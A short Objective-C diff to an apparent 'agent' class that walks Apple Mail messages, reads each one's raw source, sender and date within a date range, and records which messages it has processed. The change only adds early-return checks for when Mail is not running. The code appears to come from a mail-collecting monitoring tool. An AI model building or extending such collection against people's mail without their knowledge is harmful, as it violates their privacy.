@@ -200,8 +200,18 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                 }
                 // take a bunch of data
                 NSDate *mailDate = msg.dateReceived;
+                if (![appleMail isRunning])
+                {
+                    [self _setMarkup]; // save markup and return
+                    return;
+                }
                 NSInteger msgSize = msg.messageSize;
                 NSNumber *key = [NSNumber numberWithInteger:msg.id];
+                if (![appleMail isRunning])
+                {
+                    [self _setMarkup]; // save markup and return
+                    return;
+                }
                 NSString *msgId = msg.messageId;
                 //verify date range
                 if (([mailDate compare:dateFrom] == NSOrderedDescending) && ([mailDate compare:dateTo] == NSOrderedAscending))
@@ -216,6 +226,11 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                             return;
                         }
                         NSString *rawMail = msg.source;
+                        if (![appleMail isRunning])
+                        {
+                            [self _setMarkup]; // save markup and return
+                            return;
+                        }
                         NSString *sender = msg.sender;
                         // verify markup
                         NSString *obj=[markup objectForKey:key];
